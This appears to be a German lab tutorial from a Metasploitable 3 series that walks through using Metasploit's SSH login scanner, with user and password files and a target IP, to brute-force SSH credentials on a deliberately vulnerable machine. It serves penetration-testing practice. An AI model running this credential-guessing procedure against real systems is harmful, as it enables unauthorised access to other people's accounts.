# SSH

## Files erstellen

User und Passwort File erstellen:

``` bash
cd Documents
nano user.txt
cp user.txt passwort.txt
ls
```

![Bild01.jpg](/images/Metaspolitable-3/SSH/Bild01.jpg)

## Starten der Metasploit-Konsole

Wenn man einen Exploit gefunden hat, der mit Metasploit funktioniert, kann man das Metasploit-Tool verwenden, um den Exploit zu starten. Dafür muss man zuerst die Metasploit-Konsole starten:

``` bash
msfconsole
```

![Bild02.jpg](/images/Metaspolitable-3/SSH/Bild02.jpg)

## Suche nach dem Exploit in der Metasploit-Konsole

Nachdem die Konsole gestartet wurde, muss man noch nach dem Exploit suchen:

``` bash
search scanner/ssh/ssh
```

![Bild03.jpg](/images/Metaspolitable-3/SSH/Bild03.jpg)

## Auswahl des Exploits

Um den Exploit auszuwählen, gibt man den folgenden Befehl ein (0 = die Nummer des Exploits in der Liste):

``` bash
use 0
```

![Bild04.jpg](/images/Metaspolitable-3/SSH/Bild04.jpg)

## Anzeigen von Optionen

Mit dem folgenden Befehl kann man sich die zu konfigurierenden Optionen anzeigen lassen:

``` bash
show options
```

![Bild05.jpg](/images/Metaspolitable-3/SSH/Bild05.jpg)

## Optionen setzen

Danach kann man mit dem folgenden Befehl die Option setzen:

```
set PASS_FILE <Pfad zur Passwort.txt>
```

![Bild06.jpg](/images/Metaspolitable-3/SSH/Bild06.jpg)

```
set USER_FILE <Pfad zur User.txt>
```

![Bild07.jpg](/images/Metaspolitable-3/SSH/Bild07.jpg)

```
set RHOSTS <IP-Adresse>
```

![Bild08.jpg](/images/Metaspolitable-3/SSH/Bild08.jpg)

```
set VERBOSE true
```

![Bild09.jpg](/images/Metaspolitable-3/SSH/Bild09.jpg)

## Starten des Exploits

Zum Schluss muss man mit dem folgenden Befehl den Exploit starten:

``` bash
run
```

![Bild10.jpg](/images/Metaspolitable-3/SSH/Bild10.jpg)
![Bild11.jpg](/images/Metaspolitable-3/SSH/Bild11.jpg)